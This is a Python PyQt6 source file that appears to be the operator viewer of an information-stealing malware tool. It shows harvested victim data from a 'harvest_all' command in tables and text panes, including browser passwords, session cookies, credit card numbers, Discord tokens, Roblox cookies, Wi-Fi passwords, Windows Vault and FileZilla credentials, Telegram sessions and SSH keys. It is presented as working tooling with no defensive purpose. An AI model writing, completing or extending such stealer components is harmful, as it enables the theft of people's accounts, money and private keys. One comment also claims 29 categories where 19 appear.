# ui/data_harvest_pane.py (Full Code)
from PyQt6.QtWidgets import (QWidget, QHBoxLayout, QListWidget, QStackedWidget, 
                             QVBoxLayout, QTableWidget, QTextEdit, 
                             QHeaderView, QTableWidgetItem, QAbstractItemView)
from PyQt6.QtCore import Qt
import json

class DataHarvestPane(QWidget):
    def __init__(self):
        super().__init__()
        
        main_layout = QHBoxLayout(self)
        
        # --- Left Side: Category List (Now with all 29 items) ---
        self.category_list = QListWidget()
        self.category_list.setFixedWidth(220)
        self.category_list.addItems([
            "System & User Info", "Hardware Info", "Security Products", "Network Info",
            "Installed Applications", "Environment Variables", "Wi-Fi Passwords", "Clipboard",
            "Browser Passwords", "Session Cookies", "Credit Cards", "Browser Autofill",
            "Browser History", "Discord Tokens", "Roblox Cookies", "Windows Vault",
            "FileZilla Credentials", "Telegram Sessions", "SSH Keys"
        ])
        main_layout.addWidget(self.category_list)
        
        # --- Right Side: Content Stack ---
        self.content_stack = QStackedWidget()
        main_layout.addWidget(self.content_stack, 1)
        
        # --- Create a view for every single category ---
        self.views = {
            "system_info": self._create_text_view(),
            "hardware_info": self._create_text_view(),
            "security_products": self._create_text_view(),
            "network_info": self._create_text_view(),
            "installed_apps": self._create_text_view(is_mono=True),
            "env_variables": self._create_text_view(is_mono=True),
            "wifi_passwords": self._create_table(["SSID", "Password"]),
            "clipboard": self._create_text_view(is_mono=True),
            "browser_passwords": self._create_table(["URL", "Username", "Password"]),
            "session_cookies": self._create_table(["Host", "Name", "Expires (UTC)", "Value"]),
            "credit_cards": self._create_table(["Name on Card", "Expires (MM/YY)", "Card Number"]),
            "browser_autofill": self._create_table(["Field Name", "Value"]),
            "browser_history": self._create_table(["URL", "Title", "Visit Count", "Last Visit (UTC)"]),
            "discord_tokens": self._create_text_view(is_mono=True),
            "roblox_cookies": self._create_text_view(is_mono=True),
            "windows_vault": self._create_table(["Resource", "Username", "Password"]),
            "filezilla": self._create_table(["Host", "Port", "Username", "Password"]),
            "telegram": self._create_text_view(),
            "ssh_keys": self._create_text_view(is_mono=True),
        }

        # Add views to the stack in the correct order
        for view in self.views.values():
            self.content_stack.addWidget(view)

        self.category_list.currentItemChanged.connect(
            lambda current: self.content_stack.setCurrentIndex(self.category_list.row(current))
        )
        self.category_list.setCurrentRow(0)

    def _create_text_view(self, is_mono=False):
        text_edit = QTextEdit()
        text_edit.setReadOnly(True)
        if is_mono: text_edit.setFontFamily("Consolas")
        return text_edit

    def _create_table(self, headers):
        table = QTableWidget()
        table.setColumnCount(len(headers))
        table.setHorizontalHeaderLabels(headers)
        table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        table.verticalHeader().setVisible(False)
        table.setSortingEnabled(True)
        return table

    def clear_all_views(self):
        for view in self.views.values():
            if isinstance(view, QTextEdit): view.clear()
            elif isinstance(view, QTableWidget): view.setRowCount(0)

    def load_data(self, results):
        self.clear_all_views()
        latest_harvest = next((r for r in reversed(results) if r.get("command_name") == "harvest_all"), None)
        
        if not latest_harvest or not isinstance(latest_harvest.get('data'), str):
            self.views["system_info"].setText("No data has been harvested for this session yet.")
            return
        
        try:
            data = json.loads(latest_harvest['data'])
            
            self._populate_text_view(self.views["system_info"], data.get('system_info', {}))
            self._populate_text_view(self.views["hardware_info"], data.get('hardware_info', {}))
            self._populate_text_view(self.views["security_products"], data.get('security_products', {}))
            self._populate_text_view(self.views["network_info"], data.get('network_info', {}))
            self.views["installed_apps"].setText(data.get('installed_apps', "Not Found"))
            self._populate_text_view(self.views["env_variables"], data.get('env_variables', {}))
            self._populate_table(self.views["wifi_passwords"], data.get('wifi_passwords', []))
            self.views["clipboard"].setText(data.get('clipboard', "Not Found"))
            self._populate_table(self.views["browser_passwords"], data.get('browser_passwords', []))
            self._populate_table(self.views["session_cookies"], data.get('session_cookies', []))
            self._populate_table(self.views["credit_cards"], data.get('credit_cards', []))
            self._populate_table(self.views["browser_autofill"], data.get('browser_autofill', []))
            self._populate_table(self.views["browser_history"], data.get('browser_history', []))
            self.views["discord_tokens"].setText("\n".join(data.get('discord_tokens', ["Not Found"])))
            self.views["roblox_cookies"].setText(data.get('roblox_cookies', "Not Found"))
            self._populate_table(self.views["windows_vault"], data.get('windows_vault', []))
            self._populate_table(self.views["filezilla"], data.get('filezilla', []))
            self.views["telegram"].setText("\n".join(data.get('telegram', ["Not Found"])))
            self.views["ssh_keys"].setText(data.get('ssh_keys', "Not Found"))

        except (json.JSONDecodeError, TypeError):
             self.views["system_info"].setText("Failed to parse harvested data. It may be corrupted or in an old format.")

    def _populate_text_view(self, view, data):
        if not data:
            view.setText("No data found.")
            return
        if isinstance(data, dict):
            html = ""
            for key, value in data.items():
                key_formatted = key.replace("_", " ").title()
                value_formatted = f"<pre>{value}</pre>" if isinstance(value, str) and '\n' in value else value
                html += f"<p><b>{key_formatted}:</b> {value_formatted}</p>"
            view.setHtml(html)
        else:
            view.setText(str(data))

    def _populate_table(self, table, data_list):
        if not isinstance(data_list, list) or not data_list:
            table.setRowCount(0)
            return
        
        table.setRowCount(len(data_list))
        for row_idx, row_data in enumerate(data_list):
            for col_idx, cell_data in enumerate(row_data):
                table.setItem(row_idx, col_idx, QTableWidgetItem(str(cell_data)))
        table.resizeColumnsToContents()
        table.resizeRowsToContents()